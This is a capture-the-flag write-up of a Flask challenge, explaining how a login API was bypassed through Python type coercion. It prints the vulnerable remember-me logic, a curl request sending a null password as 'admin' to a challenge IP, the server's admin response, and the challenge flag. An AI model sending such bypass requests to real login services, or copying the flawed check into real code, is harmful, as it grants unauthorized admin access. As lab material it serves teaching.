# 🔐 SecureAuth™ – Writeup

Challenge: Python Type Coercion Authentication Bypass

# 🧭 Overview

SecureAuth™ is a minimalist Flask application that pretends to be an enterprise-grade authentication platform. In reality, it is held together with Tailwind CSS and misplaced confidence. Our mission was to gain admin access and retrieve the flag.

The challenge theme revolves around type coercion vulnerabilities in Python, and the final exploit beautifully demonstrates how easily logic breaks when your backend trusts JSON types a little too much.

# 🔍 Initial Recon

Visiting the home page revealed a simple login form that communicated with:
POST /api/authenticate

The API accepted the following structure:
{
  "username": "string",
  "password": "string",
  "remember": boolean
}

Using default credentials (guest : guest123), we gained access to a Guest Dashboard — cute, but useless.
The Admin Panel link immediately redirected us back to /, confirming that access was gated by Flask session cookies.

No static JS files.
No debug endpoints.
No .env leaks.
Intern code must've been copy-pasted from ChatGPT 3.5 in 2022.

# 🧪 Testing Authentication Logic

We probed the login endpoint for injection, weak username logic, and static file leaks. Everything was locked down — no accidental JS, no hidden admin creds, no secret key exposures.

At this point, the only logical attack surface was the actual authentication logic, not the filesystem.

Python developers often write code like:
if not password:
    # alternative login logic

or even worse:
if remember and not password and username == "admin":
    # restore admin session

This suggested that the “remember-me” option was implemented incorrectly.

Time for some type confusion wizardry. 🪄

# 🧨 Exploit: Python Type Coercion Bypass

We targeted the admin user directly, using null instead of a password and enabling remember-me.

# Payload
curl -i -s \
  -X POST 'http://18.212.136.134:5200/api/authenticate' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password": null,"remember": true}'

# Result

The backend happily replied:
{
  "flag": "FLAG{py7h0n_typ3_c03rc10n_byp4ss}",
  "message": "Authentication successful",
  "role": "admin",
  "success": true,
  "user": "admin"
}

Python converted null → None, and not None evaluated to True, pushing execution into a broken “restore admin” flow.

The intern basically wrote:

“If remember-me is on and no password is provided, let admin in. What could go wrong?”

Everything, my dear intern. Everything. 😌

# 🏁 Final Flag
FLAG{py7h0n_typ3_c03rc10n_byp4ss}

# 💬 Closing Thoughts

A glorious reminder that type checks matter, Python’s truthiness can betray you, and interns should not be allowed to roll their own auth logic unless supervised by at least one adult.

But hey — it made for a fun challenge. 😄
